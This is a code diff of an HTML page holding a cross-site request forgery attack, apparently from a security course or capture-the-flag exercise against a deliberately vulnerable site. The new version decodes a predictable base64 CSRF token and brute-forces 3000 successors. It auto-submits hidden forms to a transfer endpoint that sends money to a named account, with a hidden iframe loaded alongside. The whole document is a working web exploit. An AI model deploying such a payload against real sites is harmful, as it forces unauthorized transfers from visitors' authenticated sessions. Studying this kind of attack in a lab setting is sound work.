@@ -1,18 +1,54 @@
 <body>
-<h1>Loading...</h1>
-  <iframe src="https://phish-me.quoccacorp.com/" style="display:none;"></iframe>
+<h1>Loading... Please wait.</h1>
+
+<iframe src="https://phish-me.quoccacorp.com/" style="display:none;"></iframe>
+
 <script>
-let last = "MjkyNw==";
-let new_token = btoa((parseInt(atob(last))+1).toString());
-let f=document.createElement('form');
-f.method='POST'; f.action='https://phish-me.quoccacorp.com/api/transfer';
-['csrf_token','username','amount'].forEach((n,i)=>{
-  let input=document.createElement('input');
-  input.type='hidden'; input.name=n;
-  input.value=[new_token,'z5508657','20'][i];
-  f.appendChild(input);
-});
-document.body.appendChild(f);
-setTimeout(()=>f.submit(),2000);
+// Hardcoded last known CSRF token
+let last = "MjkyNw=="; 
+
+// Decode last known token
+let base = parseInt(atob(last));
+
+// Try 3000 future tokens
+for (let i = 1; i <= 3000; i++) {
+    let number = base + i;
+    let new_token = btoa(number.toString());
+    
+    // Create a form
+    let f = document.createElement('form');
+    f.method = 'POST';
+    f.action = 'https://phish-me.quoccacorp.com/api/transfer';
+    f.style.display = 'none';
+    
+    // csrf_token
+    let csrf = document.createElement('input');
+    csrf.type = 'hidden';
+    csrf.name = 'csrf_token';
+    csrf.value = new_token;
+    f.appendChild(csrf);
+    
+    // username
+    let user = document.createElement('input');
+    user.type = 'hidden';
+    user.name = 'username';
+    user.value = 'z5508657'; // Change to your account
+    f.appendChild(user);
+    
+    // amount
+    let amount = document.createElement('input');
+    amount.type = 'hidden';
+    amount.name = 'amount';
+    amount.value = '20';
+    f.appendChild(amount);
+    
+    document.body.appendChild(f);
+    
+    // Delay each form submission slightly
+    setTimeout(() => {
+        f.submit();
+    }, i * 150); // 150ms delay between submits to avoid overload
+}
 </script>
+
 </body>
